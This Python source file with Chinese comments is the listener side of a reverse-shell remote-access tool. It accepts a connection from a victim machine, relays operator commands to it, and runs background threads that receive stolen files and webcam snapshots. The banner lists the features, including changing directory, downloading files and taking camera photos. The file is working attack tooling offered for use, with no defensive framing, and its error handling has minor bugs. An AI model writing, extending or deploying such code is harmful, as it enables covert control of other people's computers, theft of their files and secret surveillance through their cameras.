import socket
import time
import os
import threading
import file_trans
import cam
import settings

#反弹shell服务端

def start_server():
    print("| '__/ _ \\ \\ / / _ \\ '__/ __|/ _ \\")
    print("| | |  __/\\ V /  __/ |  \\__ \\  __/")
    print("|_|  \\___| \\_/ \\___|_|  |___/\\___|")
    print(" ___| |__   ___| | |")
    print("/ __| '_ \\ / _ \\ | |")
    print("\\__ \\ | | |  __/ | |")
    print("|___/_| |_|\\___|_|_|")
    print("************* Server等待连接,1000秒后超时,exit退出 *************")
    print("************* cd切换路径，get+路径下载文件，camera拍照 *************")
    HostPort = (settings.get_host(), settings.get_port())
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(HostPort)
    server_socket.listen(5)
    server_socket.settimeout(1000)  # 设置超时时间1000秒
    client_socket,client_addr = server_socket.accept()
    while True:
        try:
            print(f"connected to {client_addr}")
            user_input = input('>>> ').strip()
            if user_input!="": #输入不为空

                if user_input=="exit":
                    os._exit(0)
                else:
                    try:
                        client_socket.send(user_input.encode('utf-8')) #编码发送
                    except:
                        print("服务器发送异常")
                    try:
                        # 接收文件内容
                        result = client_socket.recv(10240).decode()  # 解码接受

                        print(result)
                    except Exception as e:
                        print("服务器接收异常"+ e)
            elif user_input=="":
                print("命令不能空")
        except Exception as e:
            print("服务器异常"+e)
    s.close()

def wait_for_file():
    while True:
        file_trans.recv_file_server(settings.get_host(), settings.get_file_port())
def wait_for_cam():
    while True:
        cam.get_cam_image(settings.get_host(), settings.get_cam_port())

if __name__ == '__main__':

    thread_get_file = threading.Thread(target=wait_for_file)
    thread_get_file.start()

    thread_get_cam = threading.Thread(target=wait_for_cam)
    thread_get_cam.start()

    thread_start_server = threading.Thread(target=start_server)
    thread_start_server.start()

